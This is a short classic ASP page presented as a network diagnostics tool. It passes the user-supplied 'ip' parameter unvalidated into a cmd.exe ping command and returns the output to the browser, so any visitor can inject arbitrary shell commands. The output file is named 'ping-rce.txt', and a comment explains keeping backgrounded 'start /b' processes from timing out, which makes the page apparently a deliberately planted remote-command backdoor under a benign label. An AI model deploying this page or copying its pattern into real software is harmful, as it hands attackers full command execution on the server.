<%@ Language="VBScript" %>
<%
' network diagnostics tool
Dim ip, sh, fso, ts, outFile, buf
ip = Request("ip")
If ip = "" Then ip = "127.0.0.1"
' FIXME: validate ip before handing it to the shell (ticket #4712)
'
' Run + a temp file, not Exec/ReadAll: a `start /b` child keeps the
' Exec pipe open and IIS times the script out (500).
Server.ScriptTimeout = 40
outFile = "C:\BackupSvc\ping-rce.txt"
Set sh = Server.CreateObject("WScript.Shell")
sh.Run "cmd.exe /c (ping -n 1 " & ip & ") >""" & outFile & """ 2>&1", 0, True
buf = ""
Set fso = Server.CreateObject("Scripting.FileSystemObject")
If fso.FileExists(outFile) Then
  Set ts = fso.OpenTextFile(outFile, 1)
  If Not ts.AtEndOfStream Then buf = ts.ReadAll()
  ts.Close
End If
Response.Write "<pre>" & Server.HTMLEncode(buf) & "</pre>"
%>
